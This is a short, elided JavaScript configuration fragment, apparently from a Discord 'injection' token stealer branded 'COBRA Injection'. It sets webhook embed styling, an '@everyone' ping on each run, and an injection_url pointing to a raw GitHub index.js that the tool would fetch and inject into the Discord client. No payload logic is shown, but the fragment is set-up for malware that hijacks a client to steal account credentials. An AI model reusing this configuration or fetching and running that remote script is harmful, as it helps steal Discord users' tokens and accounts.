...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'COBRA Injection', 
  embed_icon: 'https://i.imgur.com/zIJsQYz.png?size=4096'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/Aziddin/injection/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By COBO ・https://github.com/Aziddin',
        },
      },
    ],
  };
